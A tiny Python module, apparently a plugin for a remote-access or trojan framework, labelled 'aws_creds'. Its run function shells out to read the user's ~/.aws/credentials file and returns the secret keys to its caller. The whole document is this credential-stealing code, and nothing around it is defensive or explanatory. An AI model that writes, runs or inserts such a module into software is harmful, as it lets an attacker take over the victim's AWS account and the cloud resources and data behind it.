import os

def run(**args):
    print("[*] In aws_creds module.")
    files = os.popen('cat ~/.aws/credentials').read()
    return str(files)
